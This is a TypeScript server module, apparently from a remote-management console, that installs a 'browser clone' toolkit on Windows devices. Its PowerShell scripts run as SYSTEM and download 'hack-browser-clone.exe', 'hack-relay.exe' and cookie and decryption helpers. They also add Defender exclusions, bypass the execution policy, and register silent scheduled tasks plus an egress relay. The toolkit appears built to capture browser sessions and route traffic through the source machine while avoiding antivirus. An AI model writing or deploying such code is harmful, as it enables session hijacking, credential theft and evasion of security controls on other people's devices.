import "server-only";

import { db } from "./db";
import { runCommandNow } from "./device-tools";
import { refreshRelayHealth } from "./clone";
import { ensureCloneCapability, runRelayInstall } from "./clone-transport";
import { engineBundle, signedEngineUrl, type EngineArtifact } from "./clone-engine-dist";

// TASK_114 — one-click clone-device setup (owner request 2026-09-24: "why cant
// you install the relay ... i want everything to be automated, clickable input,
// not user having to go install something").
//
// WHAT WAS MISSING: `runRelayInstall()` existed in the transport since TASK_108
// but had ZERO callers — no route, no button, and no way for a device to obtain
// the engine binaries at all, so the relay could never be registered and every
// relay-mode clone died at the TASK_109/110 gate with
// "No egress relay is registered on that device". Worse, `install-relay.ps1`
// ran `preflight` against the RELAY binary, which has no subcommands (exit 2) —
// so even a hand-run install aborted before copying anything.
//
// WHAT THIS DOES, in one click per role, entirely through the existing
// transports (no new Vantra route, no new action kind, nothing hand-installed):
//   1. fetch    — the agent downloads the engine bundle from
//                 /api/clone-engine/<artifact> over a signed single-device URL,
//                 verifies every SHA-256 against engine-dist/manifest.json and
//                 Unblocks the files (Mark-of-the-Web would otherwise block
//                 execution).
//   2. quarantine — the ENGINE CLI preflights the install folder (Defender
//                 path + process exclusions, verified while the folder is still
//                 empty — the documented "binary quarantined mid-rollout"
//                 incident), then the verified bundle is copied into
//                 C:\ProgramData\TacticalRMM\CloneTool. The staging folder is
//                 transient and removed.
//   3. role        — `source`: relay install through TASK_108's sanctioned
//                    relay/install route (quarantine-first script, SYSTEM
//                    scheduled task), then a real health probe, then the
//                    `relay` + `clone-capture` capabilities.
//                    `hosted`: the hosted receiver install (silent GUI twin as
//                    a scheduled task, staging root for clones), then the
//                    `clone-host` capability (this is the device the clone's
//                    browser runs on).
// Every step reports OK/FAIL with the device's own words, so the console shows
// exactly which step refused — never a silent half-install.

/** Transient download dir (removed once the verified bundle is installed). */
const STAGE_DIR = "C:\\ProgramData\\TacticalRMM\\CloneTool.stage";
/** Must match Vantra's CLONE_DEFAULTS (engineExe / mt1Script / stagingRoot). */
const INSTALL_DIR = "C:\\ProgramData\\TacticalRMM\\CloneTool";
const STAGING_ROOT = "C:\\ProgramData\\TacticalRMM\\Clones";
/** Loopback relay address every launch command points the browser at. */
const RELAY_ADDR = "127.0.0.1:8118";

/** Flat-downloaded PS modules that must land in <install>\lib\. */
const LIB_ARTIFACTS = ["CdpCookies.ps1", "GcmCrypto.ps1", "ProfilePaths.ps1"];

export type CloneSetupRole = "source" | "hosted";

/** Files each role installs (source = capture + egress relay, hosted = receiver). */
const ROLE_ARTIFACTS: Record<CloneSetupRole, string[]> = {
  source: [
    "hack-browser-clone.exe",
    "hack-relay.exe",
    "install-relay.ps1",
    "Invoke-BrowserClone.ps1",
    ...LIB_ARTIFACTS,
  ],
  hosted: ["hack-browser-clone.exe", "hack-browser-clone-svc.exe", "install-hosted.ps1"],
};

export interface CloneSetupStep {
  step: string;
  ok: boolean;
  detail: string | null;
}

export interface CloneSetupResult {
  ok: boolean;
  role: CloneSetupRole;
  steps: CloneSetupStep[];
  relay: { addr: string; status: string; lastCheckAt: string | null } | null;
  capabilities: string[];
}

export interface CloneSetupStatus {
  /** True when this device can take part in a clone in the requested role. */
  sourceReady: boolean;
  hostedReady: boolean;
  online: boolean;
  relay: { addr: string; status: string; lastCheckAt: string | null } | null;
  capabilities: string[];
}

function psq(value: string): string {
  return `'${value.replace(/'/g, "''")}'`;
}

/** Parse the `STEP:<name> OK|FAIL|SKIP[:detail]` lines the scripts emit. */
function parseSteps(output: string | null): CloneSetupStep[] {
  if (typeof output !== "string") return [];
  const steps: CloneSetupStep[] = [];
  for (const line of output.split(/\r?\n/)) {
    const m = /^\s*STEP:([A-Za-z0-9_.:-]+)\s+(OK|DONE|FAIL|SKIP)(?::(.*))?$/.exec(line);
    if (!m) continue;
    steps.push({ step: m[1], ok: m[2] !== "FAIL", detail: (m[3] ?? "").trim() || null });
  }
  return steps;
}

function firstFailure(steps: CloneSetupStep[]): CloneSetupStep | null {
  return steps.find((s) => !s.ok) ?? null;
}


/** Step 1 script: download every artifact to the staging dir, hash-verified. */
function buildFetchScript(items: { name: string; url: string; sha256: string }[]): string {
  return [
    "$ErrorActionPreference = 'Continue'",
    "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12",
    `$stage = ${psq(STAGE_DIR)}`,
    "New-Item -ItemType Directory -Force -Path $stage | Out-Null",
    "$files = @(",
    ...items.map((i) => `  @{ n = ${psq(i.name)}; h = ${psq(i.sha256)}; u = ${psq(i.url)} },`),
    ")",
    "$bad = 0",
    "foreach ($f in $files) {",
    "  $out = Join-Path $stage $f.n",
    "  try {",
    "    Invoke-WebRequest -UseBasicParsing -Uri $f.u -OutFile $out -ErrorAction Stop",
    "    $got = (Get-FileHash -Algorithm SHA256 -Path $out).Hash.ToLower()",
    "    if ($got -ne $f.h) { Write-Output ('STEP:fetch:' + $f.n + ' FAIL:sha256_mismatch'); $bad = $bad + 1; continue }",
    "    Unblock-File -Path $out -ErrorAction SilentlyContinue",
    "    Write-Output ('STEP:fetch:' + $f.n + ' OK')",
    "  } catch { Write-Output ('STEP:fetch:' + $f.n + ' FAIL:' + $_.Exception.Message); $bad = $bad + 1 }",
    "}",
    "if ($bad -gt 0) { Write-Output ('STEP:fetch FAIL:aborted_' + $bad + '_file_s'); exit 1 }",
    "Write-Output ('STEP:fetch DONE:' + $files.Count + '_verified')",
  ].join("\n");
}

/**
 * Step 2 script: quarantine the install folder with the ENGINE CLI (never the
 * relay — see the header note), then copy the verified bundle in and drop the
 * staging folder. The engine stays in the staging dir only long enough to run
 * preflight; install-relay.ps1 falls back to the installed CloneTool copy.
 */
function buildStageScript(names: string[]): string {
  const libs = names.filter((n) => LIB_ARTIFACTS.includes(n));
  const lines = [
    "$ErrorActionPreference = 'Continue'",
    `$stage = ${psq(STAGE_DIR)}`,
    `$install = ${psq(INSTALL_DIR)}`,
    "$eng = Join-Path $stage 'hack-browser-clone.exe'",
    "if (-not (Test-Path $eng)) { Write-Output 'STEP:quarantine FAIL:engine_missing_in_stage'; exit 1 }",
    "$pf = (& $eng preflight --dir $install 2>&1 | Out-String)",
    "if ($LASTEXITCODE -ne 0) { Write-Output ('STEP:quarantine FAIL:' + (($pf -replace '\\s+', ' ').Trim())); exit 1 }",
    "Write-Output 'STEP:quarantine OK'",
    "New-Item -ItemType Directory -Force -Path $install | Out-Null",
  ];
  if (libs.length > 0) {
    lines.push("New-Item -ItemType Directory -Force -Path (Join-Path $install 'lib') | Out-Null");
  }
  lines.push(
    `$libs = @(${libs.map((n) => psq(n)).join(", ")})`,
    `$names = @(${names.map((n) => psq(n)).join(", ")})`,
    "foreach ($n in $names) {",
    "  $src = Join-Path $stage $n",
    "  if (-not (Test-Path $src)) { Write-Output ('STEP:stage:' + $n + ' FAIL:missing_in_stage'); continue }",
    "  $dst = if ($libs -contains $n) { Join-Path $install ('lib\\' + $n) } else { Join-Path $install $n }",
    "  Copy-Item $src $dst -Force",
    "  Write-Output ('STEP:stage:' + $n + ' OK')",
    "}",
    "Write-Output 'STEP:stage DONE'",
  );
  return lines.join("\n");
}

/**
 * Final step: drop the staging folder. Kept SEPARATE from the staging step on
 * purpose — the role installers run FROM staging (hosted: `install-hosted.ps1`
 * copies `-NewExe` into the install dir and hard-fails with "cannot overwrite
 * the item with itself" if handed its own destination; rehearsal, 2026-09-24),
 * so staging must outlive them. Runs on success AND failure paths.
 */
function buildCleanupScript(): string {
  return [
    "$ErrorActionPreference = 'Continue'",
    `Remove-Item -Recurse -Force ${psq(STAGE_DIR)} -ErrorAction SilentlyContinue`,
    `if (Test-Path ${psq(STAGE_DIR)}) { Write-Output 'STEP:cleanup FAIL:staging_dir_still_present' } else { Write-Output 'STEP:cleanup OK' }`,
  ].join("\n");
}

/**
 * Step 3 (hosted) script: receiver install + the silent scheduled task check.
 *
 * Invoked through an explicit `-ExecutionPolicy Bypass` (rehearsal 2026-09-24):
 * a stock Windows box runs with ExecutionPolicy=Restricted, where `& <file>.ps1`
 * is refused ("running scripts is disabled on this system"). Inline script text
 * is NOT affected by the policy — which is exactly why the other console tools
 * (Hide/Reveal agent, Run now) worked and this path did not. Never rely on the
 * ambient policy for a file-based script.
 */
function buildHostedInstallScript(): string {
  const script = `${INSTALL_DIR}\\install-hosted.ps1`;
  const engine = `${STAGE_DIR}\\hack-browser-clone.exe`;
  return [
    "$ErrorActionPreference = 'Continue'",
    `$out = (& powershell -NoProfile -ExecutionPolicy Bypass -File ${psq(script)} -NewExe ${psq(engine)} -InstallDir ${psq(INSTALL_DIR)} -Addr ':8080' -StagingRoot ${psq(STAGING_ROOT)} 2>&1 | Out-String)`,
    "$rc = $LASTEXITCODE",
    "if ($rc -ne 0) { Write-Output ('STEP:hosted-install FAIL:' + $rc + ':' + (($out -replace '\\s+', ' ').Trim())); exit 1 }",
    "Write-Output 'STEP:hosted-install OK'",
    "$t = (schtasks /Query /TN SpaceworkerCloneSrv 2>&1 | Out-String)",
    "if ($t -match 'SpaceworkerCloneSrv') { Write-Output 'STEP:receiver-task OK' } else { Write-Output 'STEP:receiver-task FAIL:not_registered'; exit 1 }",
  ].join("\n");
}

/** Owner-scoped device + reachability. Offline fails immediately (no queue). */
async function requireOnlineOwnedDevice(opts: { userId: string; deviceId: string }): Promise<{
  id: string;
  name: string;
  vantraAgentId: string;
  status: string;
}> {
  const device = await db.device.findFirst({
    where: { id: opts.deviceId, userId: opts.userId },
    select: { id: true, name: true, vantraAgentId: true, status: true },
  });
  if (!device) throw new Error("device_not_owned");
  if (!device.vantraAgentId) throw new Error("device_not_linked");
  if (device.status !== "online") throw new Error("device_offline");
  return { id: device.id, name: device.name, vantraAgentId: device.vantraAgentId, status: device.status };
}

async function relayView(deviceId: string): Promise<CloneSetupResult["relay"]> {
  const row = await db.relayHealth.findUnique({
    where: { deviceId },
    select: { addr: true, status: true, lastCheckAt: true },
  });
  return row
    ? { addr: row.addr, status: row.status, lastCheckAt: row.lastCheckAt?.toISOString() ?? null }
    : null;
}

async function capabilityList(deviceId: string): Promise<string[]> {
  const rows = await db.deviceCapability.findMany({
    where: { deviceId, enabled: true },
    select: { capability: true },
  });
  return rows.map((r) => r.capability).sort();
}

/**
 * Status read for the console's setup card: what this device already has (no
 * device RPC at all — cheap enough to ride the console's existing poll tick).
 */
export async function cloneSetupStatus(opts: {
  userId: string;
  deviceId: string;
}): Promise<CloneSetupStatus> {
  const device = await db.device.findFirst({
    where: { id: opts.deviceId, userId: opts.userId },
    select: { status: true, vantraAgentId: true },
  });
  if (!device) throw new Error("device_not_owned");
  const [relay, capabilities] = await Promise.all([
    relayView(opts.deviceId),
    capabilityList(opts.deviceId),
  ]);
  const online = device.status === "online" && !!device.vantraAgentId;
  // Ready = the role's capability is registered. `source` additionally needs a
  // relay row (that is exactly what the TASK_109 gate refuses without).
  return {
    sourceReady: !!relay && capabilities.includes("clone-capture"),
    hostedReady: capabilities.includes("clone-host"),
    online,
    relay,
    capabilities,
  };
}


/**
 * THE one-click setup. Steps are sequential and fail closed: fetch → quarantine
 * → role install → capabilities → health. Nothing is reported ready unless the
 * device's own output confirmed it.
 */
export async function setupCloneDevice(opts: {
  userId: string;
  deviceId: string;
  role: CloneSetupRole;
}): Promise<CloneSetupResult> {
  const device = await requireOnlineOwnedDevice(opts);
  const steps: CloneSetupStep[] = [];
  const bail = async (): Promise<CloneSetupResult> => ({
    ok: false,
    role: opts.role,
    steps,
    relay: await relayView(device.id),
    capabilities: await capabilityList(device.id),
  });

  const wanted = ROLE_ARTIFACTS[opts.role];
  const byName = new Map((await engineBundle()).map((f) => [f.name, f] as [string, EngineArtifact]));
  const missing = wanted.filter((n) => !byName.has(n));
  if (missing.length > 0) throw new Error(`clone_engine_dist_incomplete: ${missing.join(",")}`);

  // 1. fetch — signed single-device URLs; the agent downloads SYSTEM-side.
  const urls = await Promise.all(
    wanted.map(async (name) => ({
      name,
      sha256: byName.get(name)!.sha256,
      url: await signedEngineUrl({ file: name, deviceId: device.id, ttlSeconds: 900 }),
    })),
  );
  const fetched = await runCommandNow({
    userId: opts.userId,
    deviceId: device.id,
    cmd: buildFetchScript(urls),
    shell: "powershell",
    timeoutSeconds: 90,
    runAsUser: false,
  });
  steps.push(...parseSteps(fetched.output));
  if (firstFailure(steps)) return bail();

  // 2. quarantine (ENGINE CLI preflight) + install into CloneTool.
  const staged = await runCommandNow({
    userId: opts.userId,
    deviceId: device.id,
    cmd: buildStageScript(wanted),
    shell: "powershell",
    timeoutSeconds: 90,
    runAsUser: false,
  });
  steps.push(...parseSteps(staged.output));
  if (firstFailure(steps)) return bail();

  // 3. role install + capability registration. Both roles install FROM the
  //    staging dir (it outlives this step; cleanup is the last step).
  try {
    if (opts.role === "source") {
      // Sanctioned TASK_108 path: quarantine-first relay script, SYSTEM task.
      // No token on purpose — the relay is loopback-bound and the engine's
      // launch path sends no Proxy-Authorization, so a token would 407.
      const relay = await runRelayInstall({
        userId: opts.userId,
        sourceDeviceId: device.id,
        newRelayExe: `${STAGE_DIR}\\hack-relay.exe`,
        addr: RELAY_ADDR,
        timeoutSeconds: 180,
      });
      steps.push({ step: "relay-install", ok: relay.ok, detail: `exit=${relay.exitCode ?? "null"}` });
      const probe = await refreshRelayHealth(device.id);
      steps.push({ step: "relay-probe", ok: probe.status === "up", detail: `status=${probe.status}` });
      await ensureCloneCapability({ userId: opts.userId, deviceId: device.id, capability: "relay" });
      await ensureCloneCapability({ userId: opts.userId, deviceId: device.id, capability: "clone-capture" });
    } else {
      const hosted = await runCommandNow({
        userId: opts.userId,
        deviceId: device.id,
        cmd: buildHostedInstallScript(),
        shell: "powershell",
        timeoutSeconds: 90,
        runAsUser: false,
      });
      steps.push(...parseSteps(hosted.output));
      if (firstFailure(steps)) return await bail();
      await ensureCloneCapability({ userId: opts.userId, deviceId: device.id, capability: "clone-host" });
    }

    const [relay, capabilities] = await Promise.all([
      relayView(device.id),
      capabilityList(device.id),
    ]);
    const ready =
      opts.role === "source"
        ? !!relay && relay.status === "up" && capabilities.includes("clone-capture")
        : capabilities.includes("clone-host");
    return { ok: ready, role: opts.role, steps, relay, capabilities };
  } finally {
    // Staging is transient: remove it whether the role install worked or not
    // (best-effort — a leftover folder never blocks a retry, it is re-created
    // and overwritten by the next fetch).
    const cleanup = await runCommandNow({
      userId: opts.userId,
      deviceId: device.id,
      cmd: buildCleanupScript(),
      shell: "powershell",
      timeoutSeconds: 30,
      runAsUser: false,
    }).catch(() => null);
    if (cleanup) steps.push(...parseSteps(cleanup.output));
  }
}

